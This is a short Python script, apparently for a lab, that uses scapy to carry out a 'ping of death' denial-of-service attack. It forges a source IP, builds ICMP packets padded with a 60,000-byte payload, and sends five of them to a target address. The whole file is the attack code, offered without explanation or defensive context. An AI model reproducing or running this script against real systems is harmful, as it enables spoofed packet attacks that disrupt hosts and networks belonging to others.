from scapy.all import send
from scapy.layers.inet import ICMP, IP

SOURCE_IP = "192.168.10.44"
TARGET_IP = "192.168.10.244"
MESSAGE = "X"
NUMBER_PACKETS = 5

pingOfDeath = IP(src=SOURCE_IP, dst=TARGET_IP) / ICMP() / (MESSAGE * 60000)
send(NUMBER_PACKETS * pingOfDeath)
